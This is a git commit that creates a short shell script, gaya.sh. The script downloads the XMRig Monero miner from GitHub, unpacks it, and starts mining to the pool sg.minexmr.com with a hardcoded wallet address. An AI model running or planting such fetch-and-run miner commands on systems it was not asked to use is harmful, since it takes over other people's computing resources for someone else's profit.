0763aa2ef613a4acd15903111b1b506ae6634fdd
pawkuy <98471003+pawkuy@users.noreply.github.com>
2022-01-26 21:31:24 +0700

    Create gaya.sh

---
+++ gaya.sh
@@ -0,0 +1,5 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz
+tar -xvf xmrig-6.15.0-linux-static-x64.tar.gz
+ls
+cd xmrig-6.15.0
+./xmrig -o sg.minexmr.com:443 -u 87JmpGnFXPUajKHDA9e1EP88h3P2GgXDFjJrh6xdZRfGLbozM6esZGhTZXK8VXY1na3SLDgaKESkEHFwYA8Ts6co9LDxvRy -k --tls --rig-id rig
